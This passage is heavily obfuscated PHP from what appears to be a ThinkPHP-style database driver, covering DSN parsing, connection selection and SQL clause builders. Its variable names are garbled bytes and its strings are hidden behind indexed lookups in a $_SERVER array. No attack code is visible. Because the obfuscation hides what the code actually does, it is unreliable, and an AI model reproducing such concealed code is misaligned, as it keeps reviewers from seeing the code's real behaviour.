} elseif (is_array($F‹ôˆëÚè©)) { $F‹ôˆëÚè© = array_change_key_case($F‹ôˆëÚè©); $F‹ôˆëÚè© = array($b”Çš´×Œ”[869] => $F‹ôˆëÚè©[$b”Çš´×Œ”[718]], $b”Çš´×Œ”[794] => $F‹ôˆëÚè©[$b”Çš´×Œ”[874]], $b”Çš´×Œ”[795] => $F‹ôˆëÚè©[$b”Çš´×Œ”[875]], $b”Çš´×Œ”[792] => $F‹ôˆëÚè©[$b”Çš´×Œ”[876]], $b”Çš´×Œ”[793] => $F‹ôˆëÚè©[$b”Çš´×Œ”[877]], $b”Çš´×Œ”[17] => $F‹ôˆëÚè©[$b”Çš´×Œ”[878]], $b”Çš´×Œ”[821] => $F‹ôˆëÚè©[$b”Çš´×Œ”[720]], $b”Çš´×Œ”[13] => isset($F‹ôˆëÚè©[$b”Çš´×Œ”[879]]) ? $F‹ôˆëÚè©[$b”Çš´×Œ”[879]] : array()); } elseif (empty($F‹ôˆëÚè©)) { if (think_config($b”Çš´×Œ”[880]) && $b”Çš´×Œ”[719] != strtolower(think_config($b”Çš´×Œ”[881]))) { $F‹ôˆëÚè© = $this->parseDSN(think_config($b”Çš´×Œ”[880])); } else { $F‹ôˆëÚè© = array($b”Çš´×Œ”[869] => think_config($b”Çš´×Œ”[881]), $b”Çš´×Œ”[794] => think_config($b”Çš´×Œ”[882]), $b”Çš´×Œ”[795] => think_config($b”Çš´×Œ”[883]), $b”Çš´×Œ”[792] => think_config($b”Çš´×Œ”[884]), $b”Çš´×Œ”[793] => think_config($b”Çš´×Œ”[885]), $b”Çš´×Œ”[17] => think_config($b”Çš´×Œ”[230]), $b”Çš´×Œ”[821] => think_config($b”Çš´×Œ”[880]), $b”Çš´×Œ”[13] => think_config($b”Çš´×Œ”[886])); } } return $F‹ôˆëÚè©; } protected function initConnect($AãëœèÃğ = true) { if (1 == think_config($_SERVER[õëù©û][18])) { $this->_linkID = $this->multiConnect($AãëœèÃğ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($eÈ®ÂòØÍÀ = false) { $A òëä—Ô˜ =& $_SERVER[õëù©û]; static $eƒŒ‘Á–‚ = array(); if (empty($eƒŒ‘Á–‚)) { foreach ($this->config as $aßèÍ¯«›ö => $DâŸÈ‹µ…) { $eƒŒ‘Á–‚[$aßèÍ¯«›ö] = explode($A òëä—Ô˜[47], $DâŸÈ‹µ…); } } if (think_config($A òëä—Ô˜[887])) { if ($eÈ®ÂòØÍÀ) { $bÃÁÎ‹Õà‰ = floor(mt_rand(0, think_config($A òëä—Ô˜[888]) - 1)); } else { if (is_numeric(think_config($A òëä—Ô˜[889]))) { $bÃÁÎ‹Õà‰ = think_config($A òëä—Ô˜[889]); } else { $bÃÁÎ‹Õà‰ = floor(mt_rand(think_config($A òëä—Ô˜[888]), count($eƒŒ‘Á–‚[$A òëä—Ô˜[792]]) - 1)); } } } else { $bÃÁÎ‹Õà‰ = floor(mt_rand(0, count($eƒŒ‘Á–‚[$A òëä—Ô˜[792]]) - 1)); } $däíµë‹¿‡ = array($A òëä—Ô˜[794] => isset($eƒŒ‘Á–‚[$A òëä—Ô˜[794]][$bÃÁÎ‹Õà‰]) ? $eƒŒ‘Á–‚[$A òëä—Ô˜[794]][$bÃÁÎ‹Õà‰] : $eƒŒ‘Á–‚[$A òëä—Ô˜[794]][0], $A òëä—Ô˜[795] => isset($eƒŒ‘Á–‚[$A òëä—Ô˜[795]][$bÃÁÎ‹Õà‰]) ? $eƒŒ‘Á–‚[$A òëä—Ô˜[795]][$bÃÁÎ‹Õà‰] : $eƒŒ‘Á–‚[$A òëä—Ô˜[795]][0], $A òëä—Ô˜[792] => isset($eƒŒ‘Á–‚[$A òëä—Ô˜[792]][$bÃÁÎ‹Õà‰]) ? $eƒŒ‘Á–‚[$A òëä—Ô˜[792]][$bÃÁÎ‹Õà‰] : $eƒŒ‘Á–‚[$A òëä—Ô˜[792]][0], $A òëä—Ô˜[793] => isset($eƒŒ‘Á–‚[$A òëä—Ô˜[793]][$bÃÁÎ‹Õà‰]) ? $eƒŒ‘Á–‚[$A òëä—Ô˜[793]][$bÃÁÎ‹Õà‰] : $eƒŒ‘Á–‚[$A òëä—Ô˜[793]][0], $A òëä—Ô˜[17] => isset($eƒŒ‘Á–‚[$A òëä—Ô˜[17]][$bÃÁÎ‹Õà‰]) ? $eƒŒ‘Á–‚[$A òëä—Ô˜[17]][$bÃÁÎ‹Õà‰] : $eƒŒ‘Á–‚[$A òëä—Ô˜[17]][0], $A òëä—Ô˜[821] => isset($eƒŒ‘Á–‚[$A òëä—Ô˜[821]][$bÃÁÎ‹Õà‰]) ? $eƒŒ‘Á–‚[$A òëä—Ô˜[821]][$bÃÁÎ‹Õà‰] : $eƒŒ‘Á–‚[$A òëä—Ô˜[821]][0], $A òëä—Ô˜[13] => isset($eƒŒ‘Á–‚[$A òëä—Ô˜[13]][$bÃÁÎ‹Õà‰]) ? $eƒŒ‘Á–‚[$A òëä—Ô˜[13]][$bÃÁÎ‹Õà‰] : $eƒŒ‘Á–‚[$A òëä—Ô˜[13]][0]); return $this->connect($däíµë‹¿‡, $bÃÁÎ‹Õà‰); } public function parseDSN($a©Æñ‚) { $EšÔĞ’‹›í =& $_SERVER[õëù©û]; if (empty($a©Æñ‚)) { return !1; } $DêÍ—í«ê‰ = parse_url($a©Æñ‚); if ($DêÍ—í«ê‰[$EšÔĞ’‹›í[164]]) { $Dà³õ•‚ = array($EšÔĞ’‹›í[869] => $DêÍ—í«ê‰[$EšÔĞ’‹›í[164]], $EšÔĞ’‹›í[794] => isset($DêÍ—í«ê‰[$EšÔĞ’‹›í[530]]) ? $DêÍ—í«ê‰[$EšÔĞ’‹›í[530]] : $EšÔĞ’‹›í[33], $EšÔĞ’‹›í[795] => isset($DêÍ—í«ê‰[$EšÔĞ’‹›í[890]]) ? $DêÍ—í«ê‰[$EšÔĞ’‹›í[890]] : $EšÔĞ’‹›í[33], $EšÔĞ’‹›í[792] => isset($DêÍ—í«ê‰[$EšÔĞ’‹›í[165]]) ? $DêÍ—í«ê‰[$EšÔĞ’‹›í[165]] : $EšÔĞ’‹›í[33], $EšÔĞ’‹›í[793] => isset($DêÍ—í«ê‰[$EšÔĞ’‹›í[166]]) ? $DêÍ—í«ê‰[$EšÔĞ’‹›í[166]] : $EšÔĞ’‹›í[33], $EšÔĞ’‹›í[17] => isset($DêÍ—í«ê‰[$EšÔĞ’‹›í[75]]) ? substr($DêÍ—í«ê‰[$EšÔĞ’‹›í[75]], 1) : $EšÔĞ’‹›í[33]); } else { preg_match($EšÔĞ’‹›í[891], trim($a©Æñ‚), $d¾²´öĞï”); $Dà³õ•‚ = array($EšÔĞ’‹›í[869] => $d¾²´öĞï”[1], $EšÔĞ’‹›í[794] => $d¾²´öĞï”[2], $EšÔĞ’‹›í[795] => $d¾²´öĞï”[3], $EšÔĞ’‹›í[792] => $d¾²´öĞï”[4], $EšÔĞ’‹›í[793] => $d¾²´öĞï”[5], $EšÔĞ’‹›í[17] => $d¾²´öĞï”[6]); } $Dà³õ•‚[$EšÔĞ’‹›í[821]] = $EšÔĞ’‹›í[33]; return $Dà³õ•‚; } protected function debug() { $DŸ²õ¶“àß =& $_SERVER[õëù©û]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $DŸ²õ¶“àß[892]; if (think_config($DŸ²õ¶“àß[893])) { think_status($DŸ²õ¶“àß[894]); think_trace($this->queryStr . $DŸ²õ¶“àß[895] . think_status($DŸ²õ¶“àß[20], $DŸ²õ¶“àß[894], 6) . $DŸ²õ¶“àß[896], $DŸ²õ¶“àß[33], $DŸ²õ¶“àß[897]); } } protected function parseLock($F°œ”Ä™Ö… = false) { $Dô«šÙó ª =& $_SERVER[õëù©û]; if (!$F°œ”Ä™Ö…) { return $Dô«šÙó ª[33]; } if ($Dô«šÙó ª[823] == $this->dbType) { return $Dô«šÙó ª[898]; } return $Dô«šÙó ª[899]; } protected function parseSet($c’â‘†‘ÆŠ) { $BŠÆÓ‘ˆã„ =& $_SERVER[õëù©û]; foreach ($c’â‘†‘ÆŠ as $bíÑ÷‹¿ˆ => $DØçÑ¦õ) { if (is_array($DØçÑ¦õ) && $BŠÆÓ‘ˆã„[281] == $DØçÑ¦õ[0]) { $dµ¢Ú·ÂÀÌ[] = $this->parseKey($bíÑ÷‹¿ˆ) . $BŠÆÓ‘ˆã„[900] . $DØçÑ¦õ[1]; } elseif (is_scalar($DØçÑ¦õ) || is_null($DØçÑ¦õ)) { $dµ¢Ú·ÂÀÌ[] = $this->parseKey($bíÑ÷‹¿ˆ) . $BŠÆÓ‘ˆã„[900] . $this->parseValue($DØçÑ¦õ); } } return $BŠÆÓ‘ˆã„[901] . implode($BŠÆÓ‘ˆã„[47], $dµ¢Ú·ÂÀÌ); } protected function bindParam($cˆ½Š…‘°, $aºŸøßïØ“) { $this->bind[$_SERVER[õëù©û][4] . $cˆ½Š…‘°] = $aºŸøßïØ“; } protected function parseBind($E…®“á„õ÷) { $E…®“á„õ÷ = array_merge($this->bind, $E…®“á„õ÷); $this->bind = array(); return $E…®“á„õ÷; } function parseKey(&$E‚Ñ¼Ö¹ïˆ, $Bƒ¬ùæ”å = true) { if ($Bƒ¬ùæ”å) { $E‚Ñ¼Ö¹ïˆ = $this->parseKeyCheck($E‚Ñ¼Ö¹ïˆ); } return $E‚Ñ¼Ö¹ïˆ; } function parseKeyCheck($DéÍĞËÃòÚ) { $BÈÉñœã =& $_SERVER[õëù©û]; $DéÍĞËÃòÚ = trim($DéÍĞËÃòÚ); if (!preg_match($BÈÉñœã[902], $DéÍĞËÃòÚ)) { think_exception($BÈÉñœã[903] . $DéÍĞËÃòÚ); } return $DéÍĞËÃòÚ; } protected function parseValue($B¾³ñÚÉƒé) { $bï–Ø Òù÷ =& $_SERVER[õëù©û]; if (is_string($B¾³ñÚÉƒé)) { $B¾³ñÚÉƒé = $bï–Ø Òù÷[862] . $this->escapeString($B¾³ñÚÉƒé) . $bï–Ø Òù÷[862]; } elseif (isset($B¾³ñÚÉƒé[0]) && is_string($B¾³ñÚÉƒé[0]) && strtolower($B¾³ñÚÉƒé[0]) == $bï–Ø Òù÷[281]) { $B¾³ñÚÉƒé = $this->escapeString($B¾³ñÚÉƒé[1]); } elseif (is_array($B¾³ñÚÉƒé)) { $B¾³ñÚÉƒé = array_map(array($this, $bï–Ø Òù÷[863]), $B¾³ñÚÉƒé); } elseif (is_bool($B¾³ñÚÉƒé)) { $B¾³ñÚÉƒé = $B¾³ñÚÉƒé ? $bï–Ø Òù÷[83] : $bï–Ø Òù÷[463]; } elseif (is_null($B¾³ñÚÉƒé)) { $B¾³ñÚÉƒé = $bï–Ø Òù÷[99]; } return $B¾³ñÚÉƒé; } protected function parseField($dñ¯ÂÖ…ñ) { $aÔïÅæ“Ü‡ =& $_SERVER[õëù©û]; if (is_string($dñ¯ÂÖ…ñ) && strpos($dñ¯ÂÖ…ñ, $aÔïÅæ“Ü‡[47])) { $dñ¯ÂÖ…ñ = explode($aÔïÅæ“Ü‡[47], $dñ¯ÂÖ…ñ); } if (is_array($dñ¯ÂÖ…ñ)) { $c§º†İÖ”Ş = array(); foreach ($dñ¯ÂÖ…ñ as $fí„ÃæÌñò => $dÓ¼‘”¦ãÜ) { if (!is_numeric($fí„ÃæÌñò)) { $c§º†İÖ”Ş[] = $this->parseKey($fí„ÃæÌñò) . $aÔïÅæ“Ü‡[904] . $this->parseKey($dÓ¼‘”¦ãÜ); } else { $c§º†İÖ”Ş[] = $this->parseKey($dÓ¼‘”¦ãÜ); } } $dÃƒëîâ§ = implode($aÔïÅæ“Ü‡[47], $c§º†İÖ”Ş); } elseif (is_string($dñ¯ÂÖ…ñ) && !empty($dñ¯ÂÖ…ñ)) { $dÃƒëîâ§ = $dñ¯ÂÖ…ñ; } else { $dÃƒëîâ§ = $aÔïÅæ“Ü‡[172]; } return $dÃƒëîâ§; } protected function parseTable($e·²ßÏ‹¶¯) { $EóÈæî¢¢Ï =& $_SERVER[õëù©û]; if (is_array($e·²ßÏ‹¶¯)) { $D±¿Ñ™ßñÑ = array(); foreach ($e·²ßÏ‹¶¯ as $Dºó¤÷©é => $e÷Ş•‘Âù°) { if (!is_numeric($Dºó¤÷©é)) { $D±¿Ñ™ßñÑ[] = $this->parseKey($Dºó¤÷©é) . $EóÈæî¢¢Ï[50] . $this->parseKey($e÷Ş•‘Âù°); } else { $D±¿Ñ™ßñÑ[] = $this->parseKey($Dºó¤÷©é); } } $e·²ßÏ‹¶¯ = $D±¿Ñ™ßñÑ; } elseif (is_string($e·²ßÏ‹¶¯)) { if (strstr($e·²ßÏ‹¶¯, $EóÈæî¢¢Ï[50])) { return $e·²ßÏ‹¶¯; } $e·²ßÏ‹¶¯ = explode($EóÈæî¢¢Ï[47], $e·²ßÏ‹¶¯); array_walk($e·²ßÏ‹¶¯, array($this, $EóÈæî¢¢Ï[811])); } return $EóÈæî¢¢Ï[905] . trim(implode($EóÈæî¢¢Ï[906], $e·²ßÏ‹¶¯), $EóÈæî¢¢Ï[817]) . $EóÈæî¢¢Ï[905]; } protected function parseWhere($cÈà–ÛÚæ›) { $EÂ »Ğ¨Ï² =& $_SERVER[õëù©û]; $Cèˆ³§è¦™ = $EÂ »Ğ¨Ï²[33]; if (is_string($cÈà–ÛÚæ›)) { $Cèˆ³§è¦™ = $cÈà–ÛÚæ›; } else { $Fä¶Ğä¸µ = isset($cÈà–ÛÚæ›[$EÂ »Ğ¨Ï²[907]]) ? strtoupper($cÈà–ÛÚæ›[$EÂ »Ğ¨Ï²[907]]) : $EÂ »Ğ¨Ï²[33]; if (in_array($Fä¶Ğä¸µ, array($EÂ »Ğ¨Ï²[908], $EÂ »Ğ¨Ï²[909], $EÂ »Ğ¨Ï²[910]))) { $Fä¶Ğä¸µ = $EÂ »Ğ¨Ï²[50] . $Fä¶Ğä¸µ . $EÂ »Ğ¨Ï²[50]; unset($cÈà–ÛÚæ›[$EÂ »Ğ¨Ï²[907]]); } else { $Fä¶Ğä¸µ = $EÂ »Ğ¨Ï²[911]; } foreach ($cÈà–ÛÚæ› as $c¯çÂÇ‚Éç => $f’èâÄÍ“ä) { $Cèˆ³§è¦™ .= $EÂ »Ğ¨Ï²[261]; if (is_numeric($c¯çÂÇ‚Éç)) { $c¯çÂÇ‚Éç = $EÂ »Ğ¨Ï²[912]; } if (0 === strpos($c¯çÂÇ‚Éç, $EÂ »Ğ¨Ï²[70])) { $Cèˆ³§è¦™ .= $this->parseThinkWhere($c¯çÂÇ‚Éç, $f’èâÄÍ“ä); } else { if (!preg_match($EÂ »Ğ¨Ï²[913], trim($c¯çÂÇ‚Éç))) { think_exception(think_lang($EÂ »Ğ¨Ï²[914]) . $EÂ »Ğ¨Ï²[4] . $c¯çÂÇ‚Éç); } $FÂ­—ÚÄ‡µ = is_array($f’èâÄÍ“ä) && isset($f’èâÄÍ“ä[$EÂ »Ğ¨Ï²[915]]); $c¯çÂÇ‚Éç = trim($c¯çÂÇ‚Éç); if (strpos($c¯çÂÇ‚Éç, $EÂ »Ğ¨Ï²[267])) { $dã¬³¬¶ù¹ = explode($EÂ »Ğ¨Ï²[267], $c¯çÂÇ‚Éç); $e“Ë½˜¿Œ = array(); foreach ($dã¬³¬¶ù¹ as $C­íî³¼æ => $D ¯³»Í©) { $BÙáóãÌÃ™ = $FÂ­—ÚÄ‡µ ? $f’èâÄÍ“ä[$C­íî³¼æ] : $f’èâÄÍ“ä; $e“Ë½˜¿Œ[] = $EÂ »Ğ¨Ï²[244] . $this->parseWhereItem($this->parseKey($D ¯³»Í©), $BÙáóãÌÃ™) . $EÂ »Ğ¨Ï²[810]; } $Cèˆ³§è¦™ .= implode($EÂ »Ğ¨Ï²[916], $e“Ë½˜¿Œ); } elseif (strpos($c¯çÂÇ‚Éç, $EÂ »Ğ¨Ï²[268])) { $dã¬³¬¶ù¹ = explode($EÂ »Ğ¨Ï²[268], $c¯çÂÇ‚Éç); $e“Ë½˜¿Œ = array(); foreach ($dã¬³¬¶ù¹ as $C­íî³¼æ => $D ¯³»Í©) { $BÙáóãÌÃ™ = $FÂ­—ÚÄ‡µ ? $f’èâÄÍ“ä[$C­íî³¼æ] : $f’èâÄÍ“ä; $e“Ë½˜¿Œ[] = $EÂ »Ğ¨Ï²[244] . $this->parseWhereItem($this->parseKey($D ¯³»Í©), $BÙáóãÌÃ™) . $EÂ »Ğ¨Ï²[810]; } $Cèˆ³§è¦™ .= implode($EÂ »Ğ¨Ï²[911], $e“Ë½˜¿Œ); } else { $Cèˆ³§è¦™ .= $this->parseWhereItem($this->parseKey($c¯çÂÇ‚Éç), $f’èâÄÍ“ä); } } $Cèˆ³§è¦™ .= $EÂ »Ğ¨Ï²[262] . $Fä¶Ğä¸µ; } $Cèˆ³§è¦™ = substr($Cèˆ³§è¦™, 0, -strlen($Fä¶Ğä¸µ)); } return empty($Cèˆ³§è¦™) ? $EÂ »Ğ¨Ï²[33] : $EÂ »Ğ¨Ï²[917] . $Cèˆ³§è¦™; } protected function parseWhereItem($C‹æ”Úğä, $dãÖÅŒ‡ÚÕ) { $cãÙî…Ü÷ =& $_SERVER[õëù©û]; $B­‹çñİ… = $cãÙî…Ü÷[33]; if (is_array($dãÖÅŒ‡ÚÕ)) { if (is_string($dãÖÅŒ‡ÚÕ[0])) { $fÎ“í¬Ñ±æ = strtolower($dãÖÅŒ‡ÚÕ[0]); if (in_array($dãÖÅŒ‡ÚÕ[0], array($cãÙî…Ü÷[900], $cãÙî…Ü÷[918], $cãÙî…Ü÷[919], $cãÙî…Ü÷[920], $cãÙî…Ü÷[921], $cãÙî…Ü÷[922]))) { $B­‹çñİ… .= $C‹æ”Úğä . $cãÙî…Ü÷[50] . $dãÖÅŒ‡ÚÕ[0] . $cãÙî…Ü÷[50] . $this->parseValue($dãÖÅŒ‡ÚÕ[1]); } elseif (preg_match($cãÙî…Ü÷[923], $dãÖÅŒ‡ÚÕ[0])) { $B­‹çñİ… .= $C‹æ”Úğä . $cãÙî…Ü÷[50] . $this->exp[$fÎ“í¬Ñ±æ] . $cãÙî…Ü÷[50] . $this->parseValue($dãÖÅŒ‡ÚÕ[1]); } elseif (preg_match($cãÙî…Ü÷[924], $dãÖÅŒ‡ÚÕ[0])) { if (is_array($dãÖÅŒ‡ÚÕ[1])) { $dÛºÒ­ØÀé = isset($dãÖÅŒ‡ÚÕ[2]) ? strtoupper($dãÖÅŒ‡ÚÕ[2]) : $cãÙî…Ü÷[909]; if (in_array($dÛºÒ­ØÀé, array($cãÙî…Ü÷[908], $cãÙî…Ü÷[909], $cãÙî…Ü÷[910]))) { $Fàêœéº‘ = array(); foreach ($dãÖÅŒ‡ÚÕ[1] as $c¦†îöøƒŠ) { $Fàêœéº‘[] = $C‹æ”Úğä . $cãÙî…Ü÷[50] . $this->exp[$fÎ“í¬Ñ±æ] . $cãÙî…Ü÷[50] . $this->parseValue($c¦†îöøƒŠ); } $B­‹çñİ… .= $cãÙî…Ü÷[244] . implode($cãÙî…Ü÷[50] . $dÛºÒ­ØÀé . $cãÙî…Ü÷[50], $Fàêœéº‘) . $cãÙî…Ü÷[810]; } } else { $B­‹çñİ… .= $C‹æ”Úğä . $cãÙî…Ü÷[50] . $this->exp[$fÎ“í¬Ñ±æ] . $cãÙî…Ü÷[50] . $this->parseValue($dãÖÅŒ‡ÚÕ[1]); } } elseif ($cãÙî…Ü÷[281] == $fÎ“í¬Ñ±æ) { $B­‹çñİ… .= $cãÙî…Ü÷[808] . $C‹æ”Úğä . $cãÙî…Ü÷[50] . $dãÖÅŒ‡ÚÕ[1] . $cãÙî…Ü÷[925]; } elseif (preg_match($cãÙî…Ü÷[926], $dãÖÅŒ‡ÚÕ[0])) { if (isset($dãÖÅŒ‡ÚÕ[2]) && $cãÙî…Ü÷[281] == $dãÖÅŒ‡ÚÕ[2]) { $B­‹çñİ… .= $C‹æ”Úğä . $cãÙî…Ü÷[50] . $this->exp[$fÎ“í¬Ñ±æ] . $cãÙî…Ü÷[50] . $dãÖÅŒ‡ÚÕ[1]; } else { if (is_string($dãÖÅŒ‡ÚÕ[1])) { $dãÖÅŒ‡ÚÕ[1] = explode($cãÙî…Ü÷[47], $dãÖÅŒ‡ÚÕ[1]); } $CŠÇÌÔ¤ª¥ = implode($cãÙî…Ü÷[47], $this->parseValue($dãÖÅŒ‡ÚÕ[1])); $B­‹çñİ… .= $C‹æ”Úğä . $cãÙî…Ü÷[50] . $this->exp[$fÎ“í¬Ñ±æ] . $cãÙî…Ü÷[808] . $CŠÇÌÔ¤ª¥ . $cãÙî…Ü÷[810]; } } elseif (preg_match($cãÙî…Ü÷[927], $dãÖÅŒ‡ÚÕ[0])) { $BÔ«È…¶æø = is_string($dãÖÅŒ‡ÚÕ[1]) ? explode($cãÙî…Ü÷[47], $dãÖÅŒ‡ÚÕ[1]) : $dãÖÅŒ‡ÚÕ[1]; $B­‹çñİ… .= $cãÙî…Ü÷[808] . $C‹æ”Úğä . $cãÙî…Ü÷[50] . $this->exp[$fÎ“í¬Ñ±æ] . $cãÙî…Ü÷[50] . $this->parseValue($BÔ«È…¶æø[0]) . $cãÙî…Ü÷[911] . $this->parseValue($BÔ«È…¶æø[1]) . $cãÙî…Ü÷[262]; } else { think_exception(think_lang($cãÙî…Ü÷[914]) . $cãÙî…Ü÷[4] . $dãÖÅŒ‡ÚÕ[0]); } } else { $a¡¿ÔÂ©¢• = count($dãÖÅŒ‡ÚÕ); $f¬ˆ¢ÓÆÄÏ = isset($dãÖÅŒ‡ÚÕ[$a¡¿ÔÂ©¢• - 1]) ? strtoupper($dãÖÅŒ‡ÚÕ[$a¡¿ÔÂ©¢• - 1]) : $cãÙî…Ü÷[33]; if (in_array($f¬ˆ¢ÓÆÄÏ, array($cãÙî…Ü÷[908], $cãÙî…Ü÷[909], $cãÙî…Ü÷[910]))) { $a¡¿ÔÂ©¢• = $a¡¿ÔÂ©¢• - 1; } else { $f¬ˆ¢ÓÆÄÏ = $cãÙî…Ü÷[908]; } for ($Dæñš÷ˆ™ˆ = 0; $Dæñš÷ˆ™ˆ < $a¡¿ÔÂ©¢•; $Dæñš÷ˆ™ˆ++) { $BÔ«È…¶æø = is_array($dãÖÅŒ‡ÚÕ[$Dæñš÷ˆ™ˆ]) ? $dãÖÅŒ‡ÚÕ[$Dæñš÷ˆ™ˆ][1] : $dãÖÅŒ‡ÚÕ[$Dæñš÷ˆ™ˆ]; if ($cãÙî…Ü÷[281] == strtolower($dãÖÅŒ‡ÚÕ[$Dæñš÷ˆ™ˆ][0])) { $B­‹çñİ… .= $cãÙî…Ü÷[244] . $C‹æ”Úğä . $cãÙî…Ü÷[50] . $BÔ«È…¶æø . $cãÙî…Ü÷[925] . $f¬ˆ¢ÓÆÄÏ . $cãÙî…Ü÷[50]; } else { $bÏÜìœØ¸à = is_array($dãÖÅŒ‡ÚÕ[$Dæñš÷ˆ™ˆ]) ? $this->exp[strtolower($dãÖÅŒ‡ÚÕ[$Dæñš÷ˆ™ˆ][0])] : $cãÙî…Ü÷[900]; if (!$bÏÜìœØ¸à && is_array($dãÖÅŒ‡ÚÕ[$Dæñš÷ˆ™ˆ]) && in_array($dãÖÅŒ‡ÚÕ[$Dæñš÷ˆ™ˆ][0], array($cãÙî…Ü÷[900], $cãÙî…Ü÷[918], $cãÙî…Ü÷[919], $cãÙî…Ü÷[920], $cãÙî…Ü÷[921], $cãÙî…Ü÷[922]))) { $bÏÜìœØ¸à = $dãÖÅŒ‡ÚÕ[$Dæñš÷ˆ™ˆ][0]; } $B­‹çñİ… .= $cãÙî…Ü÷[244] . $C‹æ”Úğä . $cãÙî…Ü÷[50] . $bÏÜìœØ¸à . $cãÙî…Ü÷[50] . $this->parseValue($BÔ«È…¶æø) . $cãÙî…Ü÷[925] . $f¬ˆ¢ÓÆÄÏ . $cãÙî…Ü÷[50]; } } $B­‹çñİ… = substr($B­‹çñİ…, 0, -4); } } else { $B­‹çñİ… .= $C‹æ”Úğä . $cãÙî…Ü÷[928] . $this->parseValue($dãÖÅŒ‡ÚÕ); } return $B­‹çñİ…; } protected function parseThinkWhere($B•¦‹»”ä´, $e­Ú Şù©¹) { $cá®ƒåùåÑ =& $_SERVER[õëù©û]; $AÔØÉšÉØ = $cá®ƒåùåÑ[33]; switch ($B•¦‹»”ä´) { case $cá®ƒåùåÑ[335]: $AÔØÉšÉØ = $e­Ú Şù©¹; break; case $cá®ƒåùåÑ[912]: $AÔØÉšÉØ = is_string($e­Ú Şù©¹) ? $e­Ú Şù©¹ : substr($this->parseWhere($e­Ú Şù©¹), 6); break; case $cá®ƒåùåÑ[929]: parse_str($e­Ú Şù©¹, $b‰ÂÓÕä¥à); if (isset($b‰ÂÓÕä¥à[$cá®ƒåùåÑ[907]])) { $fÕÔªÈ«ó = $cá®ƒåùåÑ[50] . strtoupper($b‰ÂÓÕä¥à[$cá®ƒåùåÑ[907]]) . $cá®ƒåùåÑ[50]; unset($b‰ÂÓÕä¥à[$cá®ƒåùåÑ[907]]); } else { $fÕÔªÈ«ó = $cá®ƒåùåÑ[911]; } $bšôòôŞº = array(); foreach ($b‰ÂÓÕä¥à as $a…ùÃ á™ => $B°éã¯»˜‹) { $bšôòôŞº[] = $this->parseKey($a…ùÃ á™) . $cá®ƒåùåÑ[928] . $this->parseValue($B°éã¯»˜‹); } $AÔØÉšÉØ = implode($fÕÔªÈ«ó, $bšôòôŞº); break; } return $AÔØÉšÉØ; } protected function parseLimit($AÙĞïÕĞÄ) { $DÉ­ øŞŸÕ =& $_SERVER[õëù©û]; return !empty($AÙĞïÕĞÄ) ? $DÉ­ øŞŸÕ[48] . $AÙĞïÕĞÄ . $DÉ­ øŞŸÕ[50] : $DÉ­ øŞŸÕ[33]; } protected function parseJoin($FÂùñßƒƒŞ) { $FÑ–í×‡Û­ =& $_SERVER[õëù©û]; $a•×ÃŒĞíç = $FÑ–í×‡Û­[33]; if (!empty($FÂùñßƒƒŞ)) { if (is_array($FÂùñßƒƒŞ)) { foreach ($FÂùñßƒƒŞ as $C‚ÚÚÏñÒÆ => $AÇÂ»Ğñ¹) { if (!1 !== stripos($AÇÂ»Ğñ¹, $FÑ–í×‡Û­[930])) { $a•×ÃŒĞíç .= $FÑ–í×‡Û­[50] . $AÇÂ»Ğñ¹; } else { $a•×ÃŒĞíç .= $FÑ–í×‡Û­[931] . $AÇÂ»Ğñ¹; } } } else { $a•×ÃŒĞíç .= $FÑ–í×‡Û­[931] . $FÂùñßƒƒŞ; } } $a•×ÃŒĞíç = preg_replace($FÑ–í×‡Û­[932], think_config($FÑ–í×‡Û­[835]) . $FÑ–í×‡Û­[933], $a•×ÃŒĞíç); return $a•×ÃŒĞíç; } protected function parseOrder($f¢ïì…Ú¾‡) { $Cç ¯„“–” =& $_SERVER[õëù©û]; if (is_array($f¢ïì…Ú¾‡)) { $Aƒ‰«–‘ˆ = array(); foreach ($f¢ïì…Ú¾‡ as $E¥Ëí„Æğ— => $C¤³É‘í§‚) { if (is_numeric($E¥Ëí„Æğ—)) { $Aƒ‰«–‘ˆ[] = $this->parseKey($C¤³É‘í§‚); } else { $C¤³É‘í§‚ = in_array(strtoupper(trim($C¤³É‘í§‚)), array($Cç ¯„“–”[934], $Cç ¯„“–”[935])) ? $Cç ¯„“–”[50] . $C¤³É‘í§‚ : $Cç ¯„“–”[33]; if (preg_match($Cç ¯„“–”[936], $E¥Ëí„Æğ—)) { $Aƒ‰«–‘ˆ[] = $this->parseKey($E¥Ëí„Æğ—) . $C¤³É‘í§‚; } else { think_exception($Cç ¯„“–”[937] . $E¥Ëí„Æğ—); } } } $f¢ïì…Ú¾‡ = implode($Cç ¯„“–”[47], $Aƒ‰«–‘ˆ); } return !empty($f¢ïì…Ú¾‡) ? $Cç ¯„“–”[938] . $f¢ïì…Ú¾‡ : $Cç ¯„“–”[33]; } protected function parseGroup($C˜ËË ¯Å³) { $d…òøÎ×»Ô =& $_SERVER[õëù©û]; return !empty($C˜ËË ¯Å³) ? $d…òøÎ×»Ô[939] . $C˜ËË ¯Å³ : $d…òøÎ×»Ô[33]; } protected function parseHaving($DìÅò÷õ·¨) { $C…Ë§ÌŠš =& $_SERVER[õëù©û]; return !empty($DìÅò÷õ·¨) ? $C…Ë§ÌŠš[940] . $DìÅò÷õ·¨ : $C…Ë§ÌŠš[33]; } protected function parseComment($b¡™Íµ†«…) { $aäƒÔ†ææ =& $_SERVER[õëù©û]; return !empty($b¡™Íµ†«…) ? $aäƒÔ†ææ[941] . $b¡™Íµ†«… . $aäƒÔ†ææ[942] : $aäƒÔ†ææ[33]; } protected function parseDistinct($e…µÃŠ…’â) { $aè³¸ìÙ¹ =& $_SERVER[õëù©û]; return !empty($e…µÃŠ…’â) ? $aè³¸ìÙ¹[943] : $aè³¸ìÙ¹[33]; } protected function parseUnion($b¢Š¡›™…) { $Bš–Éî‰óÙ =& $_SERVER[õëù©û]; if (empty($b¢Š¡›™…)) { return $Bš–Éî‰óÙ[33]; } if (isset($b¢Š¡›™…[$Bš–Éî‰óÙ[332]])) { $fƒ÷Œ„òæ = $Bš–Éî‰óÙ[944]; unset($b¢Š¡›™…[$Bš–Éî‰óÙ[332]]); } else { $fƒ÷Œ„òæ = $Bš–Éî‰óÙ[945]; } foreach ($b¢Š¡›™… as $CÓÒññç‡×) { $c¾äæ³ß‚[] = $fƒ÷Œ„òæ . (is_array($CÓÒññç‡×) ? $this->buildSelectSql($CÓÒññç‡×) : $CÓÒññç‡×); } return implode($Bš–Éî‰óÙ[50], $c¾äæ³ß‚); } public function insert($E‚ŸÌóã›, $aÍ¯“ŒÑÒ = array(), $aØî†øÕ´š = false) { goto fÔá±Éë›¤; 